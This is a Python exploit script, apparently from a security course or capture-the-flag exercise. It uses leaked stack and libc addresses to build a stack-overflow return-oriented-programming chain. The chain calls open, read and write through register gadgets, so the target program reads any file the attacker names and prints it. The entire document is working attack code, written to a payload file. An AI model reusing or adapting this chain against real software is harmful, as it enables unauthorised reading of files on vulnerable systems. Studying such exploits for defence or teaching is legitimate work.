import sys

def pack32(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(4, "\x00")
    return s

def pack64(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(8, "\x00")
    return s

def main(args):
    GDB = (len(args) > 1 and args[1] == 'gdb')
    BYTES = 100
    s_ebpaddr = 0x7ffffffedb60
    s_bufaddr = 0x7ffffffedb10
    s_retaddr = 0x7ffffffedb48

    s_rdigdt = 0x00007fffff051102
    s_rsigdt = 0x00007fffff0502e8
    s_rdxgdt = 0x00007fffff031b92
    s_setbufaddr    = 0x7fffff09fdbd
    s_openaddr      = 0x7fffff127030
    s_readaddr      = 0x7fffff127250
    s_writeaddr     = 0x7fffff1272b0

    print("initexploit1b: ")
    import initexploit1b
    ebpaddr_str = ""
    if (GDB):
        ebpaddr_str = "0x7ffffffedb60"
    else:
        ebpaddr_str = initexploit1b.main("initexploit1b.py")
    ebpaddr = int(ebpaddr_str, 16)
    print("Saved $EBP address:        0x{:016x}".format(ebpaddr))

    bufaddr = ebpaddr - (s_ebpaddr - s_bufaddr)
    retaddr = ebpaddr - (s_ebpaddr - s_retaddr)
    print("Calculated buffer address: 0x{:016x}".format(bufaddr))
    print("Calculated return address: 0x{:016x}".format(retaddr))
    print("")

    print("initexploit2b: ")
    import initexploit2b
    setbufaddr_str = ""
    if (GDB):
        setbufaddr_str = "0x7fffff09fdbd"
    else:
        setbufaddr_str = initexploit2b.main("initexploit2b.py")
    setbufaddr = int(setbufaddr_str, 16)
    print("Libc setbuff address:      0x{:016x}".format(setbufaddr))

    openaddr = setbufaddr - (s_setbufaddr - s_openaddr)
    readaddr = openaddr - (s_openaddr - s_readaddr)
    writeaddr = openaddr - (s_openaddr - s_writeaddr)
    print("Calculated open address:   0x{:016x}".format(openaddr))
    print("Calculated read address:   0x{:016x}".format(readaddr))
    print("Calculated write address:  0x{:016x}".format(writeaddr))
    rdigdt = setbufaddr - (s_setbufaddr - s_rdigdt)
    rsigdt = setbufaddr - (s_setbufaddr - s_rsigdt)
    rdxgdt = setbufaddr - (s_setbufaddr - s_rdxgdt)
    print("Calculated rdigdt address: 0x{:016x}".format(rdigdt))
    print("Calculated rsigdt address: 0x{:016x}".format(rsigdt))
    print("Calculated rdxgdt address: 0x{:016x}".format(rdxgdt))

    # Read the filename from attacker
    # Must be null-terminated
    print("What file do you want to read?")
    filepath = raw_input() + '\x00'
    assert(len(filepath) <= retaddr - bufaddr)

    print("How many bytes? (Note that if its more than file size you'll SEGFAULT)")
    BYTES = int(raw_input())

    payload_len = (retaddr - bufaddr) + (19 * 8)

    payload = filepath
    payload += "A" * (retaddr - bufaddr - len(filepath))

    # open, 5 * 8 bytes
    payload += pack64(rsigdt)
    payload += pack64(0)        # arg2: open() access mode
    payload += pack64(rdigdt)
    payload += pack64(bufaddr)  # arg1: file path
    payload += pack64(openaddr)

    # read, 7 * 8  bytes
    payload += pack64(rdxgdt)
    payload += pack64(BYTES)                    # arg3: num_bytes
    payload += pack64(rsigdt)
    payload += pack64(bufaddr + payload_len)    # arg2: right below our payload
    payload += pack64(rdigdt)
    payload += pack64(3)                        # arg1: guessing the file descriptor is 3, second file opened
    payload += pack64(readaddr)

    # write, 7 * 8 bytes
    payload += pack64(rdxgdt)
    payload += pack64(BYTES)                    # arg3: num_bytes
    payload += pack64(rsigdt)
    payload += pack64(bufaddr + payload_len)    # arg2: right below our payload
    payload += pack64(rdigdt)
    payload += pack64(1)                        # arg1: stdout
    payload += pack64(writeaddr)

    print("Length of payload supposed to be: ", payload_len)
    print("Length of payload is: ", len(payload))
    assert(len(payload) == payload_len)

    e = open("exploit", "w+")
    e.write(payload)

    i = open("input", "w+")
    i.write("-1\n")

if __name__ == '__main__':
    main(sys.argv)
